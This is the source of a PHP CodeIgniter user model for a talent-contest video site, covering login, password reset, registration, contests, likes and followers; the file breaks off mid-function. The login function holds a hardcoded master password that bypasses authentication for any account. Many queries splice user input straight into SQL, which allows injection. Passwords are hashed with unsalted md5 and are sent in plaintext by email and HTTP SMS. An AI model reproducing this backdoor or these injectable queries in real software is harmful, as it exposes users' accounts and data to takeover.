<?php
if (!defined('BASEPATH')) exit('No direct script access allowed');

class User extends CI_Model {
    public function __construct() {
        parent::__construct();
        // Load the database library
        $this->load->database();
        $this->userTbl = 'customer';
        $this->packagesTbl = 'packages';
        $this->categoryTbl = 'categorys';
        $this->cityTbl = 'city';
        $this->order = 'transaction_summery';
    }

 		function direct_update($id,$amount,$column)
	{
		//$this->db->query('UPDATE customer SET '.$column.' = '.$column.' + '.$amount.' where customer_id = '.$id.'');	
		// $this->db->query("UPDATE customer SET direct = direct + 1 WHERE customer_id = $id"); 
		 $this->db->query('UPDATE customer SET '.$column.' = '.$column.' + '.$amount.' where customer_id = "'.$id.'"'); 
	}
	function update_manual($table,$where,$data){
		$this->db->where($where);
		$this->db->update($table, $data); 
		return TRUE; 
		
	}
	
	function active_slider($type){
	$this->db->select('*');
	$this->db->from('banner');
	$this->db->where('type',$type);
	$this->db->where('status','active');
	$query = $this->db->get();
	return $query->result_array(); 
	}
	
	function websites($limit){
	$this->db->select('*');
	$this->db->from('webstores');
	$this->db->where('web_status','active');
	if($limit==6){
	$this->db->limit(6);
	}
	$query = $this->db->get();
	return $query->result_array(); 
	}
	
		function get_merchants($limit)
{
	$this->db->select('m.*,mm.city,mm.state,mm.brand_proof,mm.address_s_1,mm.brands');
	$this->db->from('merchants as m');
	$this->db->join('merchant_meta as mm','mm.merchant_id = m.id','left');
	if($limit==24){
	$this->db->limit(24);
	}
	$query = $this->db->get();
	return $query->result_array(); 
}
	
	function getuserdata($userid){
	$this->db->select('*');
	$this->db->from('customer');
	$this->db->where('id',$userid);
	$this->db->where('status','active');
	$query = $this->db->get();
	return $query->result_array(); 
	}
	
	
	// old data
	
function my_directs($cust_id){

	    $this->db->select('*');
		$this->db->from('customer');
		$this->db->where('parent_customer_id',$cust_id);
		$query = $this->db->get();
		return $query->result_array();
	} 
	function my_friends_in($cust_id){

	    $this->db->select('*');
		$this->db->from('customer');
		$this->db->where_in('parent_customer_id',$cust_id);
		$query = $this->db->get();
		return $query->result_array();
	}
		function get_prime_member()
{
	$this->db->select('*');
	$this->db->from('prime_member');
	$this->db->order_by('id','desc');
	$this->db->limit(1);
	$query = $this->db->get();
	return $query->result_array(); 
}

	function get_news()
{
	$this->db->select('*');
	$this->db->from('news');
	$this->db->where('status','active');
	$this->db->limit(1);
	$query = $this->db->get();
	return $query->result_array(); 
}
	function insert_prime_member($data)
	{
		$insert = $this->db->insert('prime_member', $data);
		$insert_id = $this->db->insert_id();
		return $insert_id;
	} 
	function get_prime_member_by_id($id)
{
	$this->db->select('p.*,l.income,l.eligibility');
	$this->db->from('prime_member as p');
	$this->db->join('prime_limit as l','l.user_id = p.user_id','left');
	$this->db->where('p.id',$id);
	$query = $this->db->get();
	return $query->result_array(); 
}
function update_prime_limit_income($id,$amount)
    {
  $this->db->query("UPDATE prime_limit SET income = income + $amount WHERE user_id = $id");  
	}

	function update_prime_eligibility_income($id,$amount)
    {
  $this->db->query("UPDATE prime_limit SET eligibility = eligibility + $amount WHERE user_id = $id");  
	}
function insert_income($data)
	{
		$insert = $this->db->insert('income', $data);
		return $insert;
	} 
	function get_prime_member_row($id)
{
	$this->db->select('p.*,l.income,l.eligibility');
	$this->db->from('prime_member as p');
	$this->db->join('prime_limit as l','l.user_id = p.user_id','left');
	$this->db->where('p.row',$id);
	$query = $this->db->get();
	return $query->result_array(); 
}
	function login($user_name,$password){
        $this->db->select('*');
        $this->db->from($this->userTbl);
		$this->db->where("(email = '$user_name' OR phone = '$user_name')");
       //$this->db->where('email',$user_name);

		if($password !=md5('Myt@15ntHunt')) {
			$this->db->where('pass_word',$password);
		}
       
	   //$this->db->where('status', 'active');
       $query = $this->db->get(); 
	 /*   if(count($query->result_array())==1) { 
    		foreach ($query->result() as $row)
    		{
    			$this->db->delete('login_details', array('user_id' => $row->id));
            	$this->db->insert('login_details', array('user_id'=>$row->id,'last_activity'=>time()));
    		}
    	} */
	   
       $result = $query->row_array();
        return $result;
    }
	
  public function userforgot($data)
{
        
        $query1=$this->db->query("SELECT * from customer where email = '".$data."' OR phone= '".$data."' ");
        $row=$query1->result_array();
        if ($query1->num_rows()>0)
{
        $passwordplain = "";
        $passwordplain  = rand(99999,999999);
        $newpass = md5($passwordplain);
        $this->db->query("update customer set pass_word='".$newpass."' where email = '".$row[0]['email']."' "); 

$sms_msg = urlencode("Your new password is ".$passwordplain."\nThank you\nTeam My Talent Hunt");
		
	$smstext = "http://103.16.101.52/sendsms/bulksms?username=bsz-talenthunt&password=".$this->config->item('sms_pass')."&type=0&dlr=1&destination=".$phone."&source=".$this->config->item('sms_sndrid')."&message=".$sms_msg."&entityid=1201159246187474002&tempid=1207161846790881162";
    				file_get_contents($smstext);		
         
        $to = $row[0]['email'];
				$headers = "MIME-Version: 1.0" . "\r\n";
				$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
				$headers .= 'From: My Talent Hunt <info@mytalenthunt.in>' . "\r\n"; 
				$subject = 'Forgot password at My Talent Hunt';
				
				$message='Hi '.$row[0]['d_name'].','. "\r\n";
        $message.='<br><br>You recently requested to reset your password for your MTH Account, so we have generated a new password for your account : <br> Your new password is <b>'.$passwordplain.'</b>'."\r\n";
        $message.='<br>You may update your password after LogIn.';
        $message.='<br><br>Thanks & Regards';
        $message.='<br>My Talent Hunt'; 
				$mail= mail($to,$subject,$message,$headers);
if ($mail) {
     return 'true';
} else {
   return 'false';
}     
}
else {
	return 'error'; 
	}
}

function insert_manual($table,$data){
		$this->db->insert($table, $data); 
		$insert_id = $this->db->insert_id();
		return $insert_id;
	}
	 
		function otp_veryfy($phone,$otp){
        $this->db->select('*');
        $this->db->from('otp_verification');
        $this->db->where('phone',$phone);
        $this->db->where('otp',$otp);
		$this->db->order_by('id', 'desc');
		$this->db->limit(1);
        $query = $this->db->get();
        $result = $query->num_rows();
        return $result;
    }
    
    function loginwithemail($user_name){
        $this->db->select('*');
        $this->db->from($this->userTbl);
       $this->db->where('email',$user_name);
       $query = $this->db->get();
	   
	    if(count($query->result_array())==1) { 
    		foreach ($query->result() as $row)
    		{
    			$this->db->delete('login_details', array('user_id' => $row->id));
            	$this->db->insert('login_details', array('user_id'=>$row->id,'last_activity'=>time()));
    		}
    	}
       $result = $query->row_array();
        return $result;
    }
    
    function update_customerdeviceid($insert,$customer_id)
	{
$data = array('device_id' =>$customer_id);
$this->db->where('id', $insert);
$this->db->update('customer', $data);
	}
	
	    public function insert($data){
	        $password = rand(10000,99999);
	        if(!array_key_exists("pass_word", $data)){
            $data['pass_word'] = md5($password);
        }
	        
        $insert = $this->db->insert($this->userTbl, $data);
        $insert_id = $this->db->insert_id();
        
        $new=str_replace(" ","_",$data['f_name']);
    		
    		
    			$f_name = $data['f_name'];
    			$phone = $data['phone'];
    			$customer_n = substr($f_name,0,2).$insert_id.substr($phone,-4);
    			$customer_id = strtoupper($customer_n);
    			$this->db->where('id', $insert_id);
    			$this->db->update('customer', array('customer_id'=>$customer_id));	
				//$this->insert_manual('customer_count_detail',array('user_id'=>$insert_id));
    			/***************** SMS ******************/
				
				if(!empty($phone)){$uid=$phone;}else{$uid=$data['email'];}

    			$sms_msg = urlencode("Hi ".$data['f_name'].",\nYour account details are summarized below : User Name : ".$uid."\n Password : ".$password."\nTeam My Talent Hunt"); 
           $smstext = "http://103.16.101.52/sendsms/bulksms?username=bsz-talenthunt&password=".$this->config->item('sms_pass')."&type=0&dlr=1&destination=".$phone."&source=".$this->config->item('sms_sndrid')."&message=".$sms_msg."&entityid=1201159246187474002&tempid=1207161829447161980";
    			file_get_contents($smstext);
		
				    $to = $data['email'];
    				$subject ="My talent hunt";
    				$txt = urldecode($sms_msg); 
    				$headers = "From: mytalenthunt.in"."\r\n";
    				$headers = "MIME-Version: 1.0" . "\r\n";     
    				$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";  
    				$headers .= 'From: <mytalenthunt.in>' . "\r\n"; 
    			    mail($to,$subject,$txt,$headers);
        
        return $insert_id;
    }
    
    function select_user_id($validate){
		$this->db->select('userid');
		$this->db->from('customer'); 
		$this->db->where('userid',$validate);
		$query = $this->db->get();
		return $query->result_array();   
	}
		function country(){
        $this->db->select('id,country_name');
        $this->db->from('countries');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    } 

		function state(){
        $this->db->select('*');
        $this->db->from('states');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    } 
	
		function city_all($id){
        $this->db->select('*');
        $this->db->from('cities');
        $this->db->where('state_id',$id);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }
	



 function category_all(){
        $this->db->select('*');
        $this->db->from($this->categoryTbl);
        $this->db->where('status','active');
        //$this->db->order_by('order_by','asc'); 
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
	function soundcategory_all(){
        $this->db->select('*');
        $this->db->from('sound_categorys');
        $this->db->where('status','active');
        $this->db->order_by('order_by','asc'); 
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }


 function contest_all($params = array()){
        $this->db->select('*');
        $this->db->from('contest');
        //$this->db->where('status','open');
		$this->db->where_in('status',array('open','partially closed'));
        if($params['type']=='image') { 
          $this->db->where('type','image');  
        }
        if($params['type']=='video') { 
          $this->db->where('type','video');  
        }
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
	function process_fee($params = array()){
        $this->db->select('*');
        $this->db->from('process_fee');
        if($params['type']=='image') { 
          $this->db->where('type','image');  
        }
        if($params['type']=='video') { 
          $this->db->where('type','video');  
        }
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }

     function get_contest_all($params = array()){
        $this->db->select('*');
        $this->db->from('contest');
        $this->db->where('status','open');
        if($params['id']!=0) { 
          $this->db->where('id',$params['id']);  
        }
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }

    

function get_all_video_by_search($search,$id){
		$this->db->select('v.*,c.d_name,c.f_name,c.l_name,c.image,c.facebook,c.linkdane,c.twiter,c.insta,c.id as cid,t.c_name,c.userid,COUNT(con.id) as contest,count(l.id) as lid,count(g.id) as gid');
		$this->db->from('videos as v'); 
		//$this->db->join('customer_count_detail as d','d.user_id=v.user_id','left');
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$id.' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$id.' ','left');
		$this->db->join('thcategorys as t','t.id=v.category','left');

		$this->db->join('contest as con','t.id=v.contest_id AND con.status= "open" ','left');
		$this->db->like('v.title',$search, 'both');  
		$this->db->or_like('c.d_name', $search, 'both'); 
		$this->db->where('v.status','Approved');
        $this->db->group_by('v.id'); 		
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(20); 
		$query = $this->db->get();
		$result = $query->result_array();
		return $result;
	}
	
	function get_all_video_by_search_count($search){
		$this->db->select('COUNT(v.id) as total_videos');
		$this->db->select('v.*,c.f_name,c.l_name,c.image,c.facebook,c.linkdane,c.twiter,c.insta,c.id as cid,t.c_name,c.userid');
		$this->db->from('videos as v'); 
		//$this->db->join('customer_count_detail as d','d.user_id=v.user_id','left');
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('thcategorys as t','t.id=v.category','left');
		$this->db->like('v.title',$search); 
		$this->db->or_like('c.d_name',$search); 
		$this->db->where('v.status','Approved'); 
		$this->db->order_by('v.mod_date','desc'); 
		$this->db->limit(16); 
		$query = $this->db->get();
		return $query->result_array();
		
	}
	function getvideohomeload($params = array()){
		$limit=$params['loadmore'];
		$this->db->select('v.*,c.userid,c.d_name,c.image,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.status','Approved');
		//$this->db->where('v.thumb','');
		$this->db->where('v.short',1);
        if($params['vid']!='0') { $this->db->where('v.id!=',$params['vid']); }		
		if($params['id']!='1') { $this->db->where('v.category',$params['id']); }
		$this->db->group_by('v.id'); 
		$this->db->order_by('v.id','RANDOM');
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		//if($params['loadmore']!=''){$this->db->where_not_in('v.id',json_decode($params['loadmore'],true));}
		//$this->db->limit(20);
		$query = $this->db->get();
		return $query->result_array();
	} 
	
	function getvideo($params = array()){
		//$limit=$params['loadmore'];
		$this->db->select('v.*,c.d_name,c.userid,c.image,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.status','Approved');
		//$this->db->where('v.thumb','');
        if($params['vid']!='0') { $this->db->where('v.id!=',$params['vid']); }		
		if($params['id']!='1') { $this->db->where('v.category',$params['id']); }
		$this->db->where('v.short',1);
		$this->db->group_by('v.id'); 
		$this->db->order_by('v.id','RANDOM');
		// if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		if($params['loadmore']!=''){$this->db->where_not_in('v.id',json_decode($params['loadmore'],true));}
		$this->db->limit(20);
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
		function getuservideo($params = array()){
		//$limit=$params['loadmore'];
		$this->db->select('v.*,c.d_name,c.userid,c.image,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.status','Approved');
        if($params['vid']!='0') { $this->db->where('v.id!=',$params['vid']); }		
		if($params['id']!='1') { $this->db->where('v.user_id',$params['id']); }
		$this->db->group_by('v.id'); 
		$this->db->order_by('v.id','DESC');
		// if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		if($params['loadmore']!=''){$this->db->where_not_in('v.id',json_decode($params['loadmore'],true));}
		//$this->db->limit(20);
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	function getvideo_by_id($params = array()){
		$this->db->select('v.*,c.d_name,c.userid,c.image,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.status','Approved'); 
		/* if($params['type']=='uservideo') { $this->db->where('v.user_id',$params['id']);}
		else{ $this->db->where('v.id',$params['id']);} */
		if($params['id']!='1') { 
		$this->db->where('v.id',$params['id']);
		}
		$this->db->query('UPDATE videos SET views = views + 1 where id = "'.$params['id'].'"');
		$this->db->group_by('v.id'); 
		$this->db->order_by('v.id','desc'); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function imagesplash($params = array()){
       //$limit=$params['limit'];
		$this->db->select('v.*,c.d_name,c.image as cimage,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('images_likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('images_votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.status','Approved');
		$this->db->group_by('v.id');
		$this->db->order_by('v.id','desc');

		//$this->db->order_by('v.id','desc'); 
		//if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		if($params['loadmore']!=''){$this->db->where_not_in('v.id',json_decode($params['loadmore'],true));}
		$this->db->limit(20);
		$query = $this->db->get();
		return $query->result_array();
	}
	
	function imagesplashloadmore($params = array()){
       $limit=$params['loadmore'];
		$this->db->select('v.*,c.d_name,c.image as cimage,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('images_likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('images_votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.status','Approved');
		$this->db->group_by('v.id');
		$this->db->order_by('v.id','desc');

		//$this->db->order_by('v.id','desc'); 
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		//if($params['loadmore']!=''){$this->db->where_not_in('v.id',json_decode($params['loadmore'],true));}
		//$this->db->limit(20);
		$query = $this->db->get();
		return $query->result_array();
	}
		function imagesplash_by_id($params = array()){

		$this->db->select('v.*,c.d_name,c.image as cimage,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('images_likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('images_votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.id',$params['id']);
		$this->db->where('v.status','Approved');
		$this->db->group_by('v.id');
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(20); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	function get_alle_imag_by_search($search,$id){
		$this->db->select('v.*,c.d_name,c.f_name,c.l_name,c.image as cimage,c.id as cid,c.userid,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('images_likes as l','l.like_id=v.id AND l.user_id= '.$id.' ','left');
		$this->db->join('images_votes as g','g.vote_id=v.id AND g.user_id= '.$id.' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->like('v.title',$search); 
		$this->db->or_like('c.d_name',$search); 
		$this->db->where('v.status','Approved'); 
		$this->db->group_by('v.id');
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(20); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	


 function getvideobyid($params = array()){
       $this->db->select('v.*,c.d_name,c.image,f.followers,COUNT(l.id) as lid,COUNT(vo.id) as votid');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('customer_count_detail as f','f.user_id=v.user_id','left'); 
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id='.$params['userid'].'','left'); 
		$this->db->join('votes as vo','vo.vote_id=v.id AND vo.user_id='.$params['userid'].'','left'); 
		$this->db->where('v.status','Approved'); 
		if($params['id']!='') { 
		$this->db->where('v.id',$params['id']);
		}
		$this->db->order_by('v.id','desc'); 
		//$this->db->limit(2); 
		$query = $this->db->get();
		return $query->result_array();
    } 
	


function getallvideo(){
		$this->db->select('v.*,c.d_name,c.f_name,c.image');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->where('v.status','Approved'); 
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
		
	}

		function getallscoreboardid($contest_id,$type){
		$this->db->select('v.id,c.d_name,c.customer_id,c.city,c.state,SUM(v.votes) as total_votes,SUM(v.point) as total_points,SUM(v.votes+(v.point)*25) as total_count');
		if($type=='image') { $this->db->from('gallery as v'); }
		else { $this->db->from('videos as v'); }
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->where('v.status','Approved'); 
		$this->db->where('v.contest_id',$contest_id); 
		$this->db->group_by('v.user_id');
		$this->db->order_by('total_count','desc');
		$this->db->limit(50);
		$query = $this->db->get();
		return $query->result_array();
		
	}
	function live_scoreboard_all($contest_id,$type=''){
		$this->db->select('v.id,c.d_name,c.customer_id,c.city,c.state,SUM(v.votes) as total_votes,SUM(v.point) as total_points,SUM(v.votes+(v.point)*25) as total_count');
		if($type=='image') { $this->db->from('gallery as v'); }
		else { $this->db->from('videos as v'); }
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->where('v.status','Approved'); 
		$this->db->where('v.contest_id',$contest_id); 
		$this->db->group_by('v.user_id'); 
		$this->db->order_by('total_count','desc');
		$this->db->limit(200);
		$query = $this->db->get();
		return $query->result_array();
		
	}

	function getRows($params = array()){
        $this->db->select('*');
        $this->db->from($this->userTbl);
        //fetch data by conditions
        if(array_key_exists("conditions",$params)){
            foreach($params['conditions'] as $key => $value){
                $this->db->where($key,$value);
            }
        }
        if(array_key_exists("id",$params)){
            $this->db->where('id',$params['id']);
            $query = $this->db->get();
            $result = $query->row_array();
        }else{
          $query = $this->db->get();
          $result = ($query->num_rows() > 0)?$query->result_array():false;
        }

        //return fetched data
        return $result;
    }	
	function get_frnds_list1($user_id,$friend_id)
{
	$this->db->select('*');
	$this->db->from('friends');
	$this->db->where("user_id='$user_id' && friend_id='$friend_id' || friend_id='$user_id' && user_id='$friend_id'");  
	$query = $this->db->get();
	return $query->result_array(); 
}

	function getuserfrnddata($params = array()){
        $this->db->select('c.*,COUNT(fr.id) as frstatus,fr.status as req_status,fr.user_id,fr.friend_id');
        $this->db->from('customer as c');
		$this->db->join('customer_count_detail as d','d.user_id=c.id','left');
		$this->db->join('friends as fr','fr.friend_id='.$params['id'].' AND fr.user_id='.$params['userid'].' OR fr.user_id='.$params['id'].' AND fr.friend_id='.$params['userid'].'','left');
		$this->db->where('c.id',$params['id']);
        $query = $this->db->get();
		return $query->result_array();
    }
    
    	function getusercertificate($params = array()){
        $this->db->select('*');
        $this->db->from('winner');
        $this->db->where('cust_id',$params['id']);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }


function uservideobyid($params = array()){
		$this->db->select('v.*,c.d_name,c.userid,c.image,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.user_id',$params['id']); 
		if(array_key_exists('status', $params)) {

		} else {
			$this->db->where('v.status','Approved');
		} 
		$this->db->group_by('v.id'); 
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
	}
	function userchannelbyid($params = array()){
		$this->db->select('v.*,c.d_name,c.userid,c.image,count(l.id) as lid,COUNT(f.id) as follow,COUNT(g.id) as followers');
		$this->db->from('channel_videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('channel_likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('channel_followers as f','f.user_id='.$params['userid'].' AND f.follow_id='.$params['id'].'','left');
		$this->db->join('channel_followers as g','g.follow_id=c.id','left');
		$this->db->where('v.user_id',$params['id']);
		if(array_key_exists('status', $params)) {

		} else {
			$this->db->where('v.status','Approved');
		} 
		$this->db->group_by('v.id'); 
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
	}
	

	
	
	 
	
	function uservideobytype($params = array()){
		$this->db->select('v.*,c.d_name,c.userid,c.image,count(l.id) as lid,count(g.id) as gid');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('likes as l','l.like_id=v.id AND l.user_id= '.$params['id'].' ','left');
		$this->db->join('votes as g','g.vote_id=v.id AND g.user_id= '.$params['id'].' ','left');
		$this->db->where('v.user_id',$params['id']);
		if($params['type']=='contest') { 
		$this->db->where('v.contest_id >','0');
		$this->db->where('v.status','Approved'); 
		}
		if($params['type']=='pending') { 
	    $this->db->where('v.status','Pending'); 
		}
		if($params['type']=='approved') { 
		$this->db->where('v.status','Approved'); 
		}
		if($params['prime']=='1') { 
		$this->db->where('v.prime','1'); 
		}
		
		$this->db->order_by('v.id','desc'); 
		$this->db->group_by('v.id'); 
		//$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	function userimagesbytype($params = array()){
		$this->db->select('v.*,c.d_name,c.image as usrimage');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->where('v.user_id',$params['id']);
		 if($params['type']=='contest') { 
		$this->db->where('v.contest_id >','0');
		$this->db->where('v.status','Approved'); 
		}
		
		if($params['type']=='pending') { 
	    $this->db->where('v.status','Pending'); 
		}
		if($params['type']=='approved') { 
		$this->db->where('v.status','Approved'); 
		}
		//$this->db->where('v.contest_id',0); 
		$this->db->order_by('v.id','desc');  
		//$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	function userimagesbyid($params = array()){
		$this->db->select('v.*,c.d_name,c.image as cimage,count(l.id) as lid,count(g.id) as gid,COUNT(t.id) as contest');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('images_likes as l','l.like_id=v.id AND l.user_id= '.$params['userid'].' ','left');
		$this->db->join('images_votes as g','g.vote_id=v.id AND g.user_id= '.$params['userid'].' ','left');
		$this->db->join('contest as t','t.id=v.contest_id AND t.status= "open" ','left');
		$this->db->where('v.user_id',$params['id']);
		if(array_key_exists('status', $params)) {

		} else {
			$this->db->where('v.status','Approved');
		}
		
		$this->db->group_by('v.id');
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	/* function userimagesbyid($params = array()){
		$this->db->select('v.*,c.d_name,c.image as cimage');
		$this->db->from('gallery as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->where('v.user_id',$params['id']); 
		$this->db->order_by('v.id','desc'); 
		$this->db->limit(30); 
		$query = $this->db->get();
		return $query->result_array();
	} */
	
	
function getrecomandedvideo(){
		$this->db->select('v.*,c.d_name,c.image');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->where('v.status','Approved'); 
		$this->db->order_by('v.id','RANDOM'); 
		$this->db->limit(4); 
		$query = $this->db->get();
		return $query->result_array();
		
	}
	
	function getvideocomment($params = array()){
		$this->db->select('v.*,c.d_name,c.image,c.id as custid');
		$this->db->from('comment as v'); 
		$this->db->join('customer as c','c.id=v.u_id','left');
		$this->db->where('v.v_id',$params['id']); 
		$this->db->order_by('v.id','desc');
		$query = $this->db->get();
		return $query->result_array();
		
	}

function getgallerycomment($params = array()){
		$this->db->select('v.*,c.d_name,c.image,c.id as custid');
		$this->db->from('gallery_comment as v'); 
		$this->db->join('customer as c','c.id=v.u_id','left');
		$this->db->where('v.v_id',$params['id']); 
		$this->db->order_by('v.id','desc');
		$query = $this->db->get();
		return $query->result_array();
		
	}	

	function getporchcomment($params = array()){
		$this->db->select('v.*,c.d_name,c.image,c.id as custid');
		$this->db->from('post_comments as v'); 
		$this->db->join('customer as c','c.id=v.u_id','left');
		$this->db->where('v.post_id',$params['id']); 
		$this->db->order_by('v.comment_id','desc');
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	
		function getuserfollowers($params = array(),$limit){
		$this->db->select('f.*,c.d_name,c.image,c.city,count(d.id) as fcount');
		$this->db->from('followers as f'); 
		$this->db->join('customer as c','c.id=f.user_id','left');
		$this->db->join('followers as d','d.user_id=f.follow_id AND d.follow_id=f.user_id','left');
		$this->db->where('f.follow_id',$params['id']); 
		$this->db->group_by('f.id'); 
		if($limit!=0) { $this->db->limit(20,$limit); }
		else { $this->db->limit(20); }
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	function getuserfollowings($params = array(),$limit){
		$this->db->select('f.*,c.d_name,c.image,c.city');
		$this->db->from('followers as f'); 
		$this->db->join('customer as c','c.id=f.follow_id','left');
		$this->db->where('f.user_id',$params['id']); 
		if($limit!=0) { $this->db->limit(20,$limit); }
		else { $this->db->limit(20); }
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function my_incentive($params = array()){
		$this->db->select('t.id,t.type,t.amount,t.status,t.rdate,c.d_name');
		$this->db->from('transaction_wallet as t'); 
		$this->db->join('customer as c','c.id=t.user_id_by','left');
		$this->db->where('t.user_id',$params['id']); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function select_mylinks($params = array()){
		$this->db->select('f.*,c.d_name,c.image,c.city');
		$this->db->from('linked_account as f'); 
		$this->db->join('customer as c','c.id=f.user_id','left');
		$this->db->where('f.linked_id',$params['id']); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function connected_links($params = array()){
		$this->db->select('f.*,c.d_name,c.image,c.city');
